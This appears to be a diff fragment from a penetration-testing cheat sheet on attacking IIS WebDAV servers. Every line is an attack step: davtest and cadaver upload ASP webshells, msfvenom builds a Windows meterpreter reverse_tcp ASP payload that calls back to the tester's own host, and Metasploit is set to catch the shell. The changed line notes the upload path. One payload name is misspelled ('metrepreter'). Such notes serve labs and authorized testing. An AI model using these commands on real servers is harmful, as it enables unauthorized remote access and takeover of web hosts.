@@ -7,7 +7,7 @@ davtest -auth user:pass -url http://url/webdav
 cadaver http://url/webdav // put /usr/share/webshells/asp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST= my_ip LPORT=1234 -f asp > payloadname.asp
 set payload windows/metrepreter/reverse_tcp 
-iis upload
+iis upload // make sure to set Path /webdavdir/payload
 
 
 MSF -
